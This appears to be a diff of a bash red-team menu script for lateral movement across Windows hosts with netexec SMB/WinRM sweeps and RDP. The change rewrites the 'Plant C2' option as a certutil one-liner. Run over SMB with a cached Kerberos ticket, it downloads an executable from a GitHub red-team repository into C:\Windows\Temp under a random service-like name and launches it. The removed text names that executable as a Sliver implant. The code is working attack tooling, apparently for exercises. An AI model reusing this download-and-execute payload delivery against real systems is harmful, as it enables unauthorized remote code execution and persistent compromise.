@@ -330,7 +330,7 @@ while true; do
   echo "  6) netexec SMB   (auth sweep all hosts)"
   echo "  7) netexec WinRM (auth sweep all hosts)"
   echo "  8) xfreerdp      (RDP → target)"
-  echo "  c) Plant C2      (download+unzip+exec Sliver → target)"
+  echo "  c) Plant C2      (certutil download+exec → target via SMB)"
   echo "  t) Change target host"
   echo "  p) Print all copy-paste commands"
   echo "  9) bash shell    (ticket pre-exported)"
@@ -370,14 +370,21 @@ while true; do
       fi ;;
     c|C)
       pick_host 0
-      # Map FQDN back to short hostname for planter
-      local C2_HOST="\${SELECTED_FQDN%%.*}"
-      echo "[*] Planting C2 on \$C2_HOST (\$SELECTED_IP) via planter.sh..."
-      local PLANTER="\$SCRIPT_DIR/planter.sh"
-      if [[ ! -f "\$PLANTER" ]]; then
-        echo "[-] planter.sh not found in \$SCRIPT_DIR"
+      C2_URL="https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe"
+      C2_RND=\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
+      C2_DROP="C:\\\\Windows\\\\Temp\\\\svc\${C2_RND}.exe"
+      C2_CMD="certutil -urlcache -split -f \\\"\${C2_URL}\\\" \\\"\${C2_DROP}\\\" >nul 2>nul & start /b \\\"\\\" \\\"\${C2_DROP}\\\""
+      echo "[*] Planting C2 on \$SELECTED_IP via SMB certutil one-liner..."
+      echo "    → \$C2_DROP"
+      C2_OUT=\$(netexec smb "\$SELECTED_IP" -u "\$GOLDUSER" --use-kcache -x "\$C2_CMD" 2>&1)
+      if echo "\$C2_OUT" | grep -qi '\\[+\\]'; then
+        echo "    [+] SUCCESS — C2 planted on \$SELECTED_IP"
       else
-        bash "\$PLANTER" -w "https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe" "\$TEAM" "\$C2_HOST"
+        echo "    [-] SMB one-liner failed."
+        echo "    Output: \$C2_OUT"
+        echo ""
+        echo "    Try running planter manually:"
+        echo "      planter \$TEAM \${SELECTED_FQDN%%.*}"
       fi ;;
     t|T)
       pick_host 0
